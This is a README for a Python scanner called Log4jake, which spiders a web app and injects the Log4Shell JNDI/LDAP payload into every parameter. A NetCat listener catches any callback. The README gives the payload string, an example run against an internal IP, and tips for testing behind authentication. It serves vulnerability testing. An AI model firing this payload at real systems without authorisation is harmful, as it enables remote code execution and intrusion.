# Log4jake

Log4jake works by spidering a web application for GET/POST requests. It will then automatically execute the GET/POST requests, filling any discovered parameters with the ${jndi:ldap://<ip>:389} Log4j payload. Note that this tool is designed to work simultaneously with a NetCat listener.
  
If you want to test behind authentication, use the commented '#req.add_header('Authorization', "token_goes_here")' line to add the proper token. If you are experiencing SSL errors, use the commented '#context = ssl._create_unverified_context()' line in addition to 'resp = urllib.request.urlopen(req, context=context)'
  
If your application is vulnerable to Log4j, your NetCat listener will receive a connection.
  
  Syntax:
```
  └─$ python3 log4jake.py https://10.10.3.50
Remember to start NetCat Listener on port 389!!!
Enter IP address of your Listener: 10.10.3.4
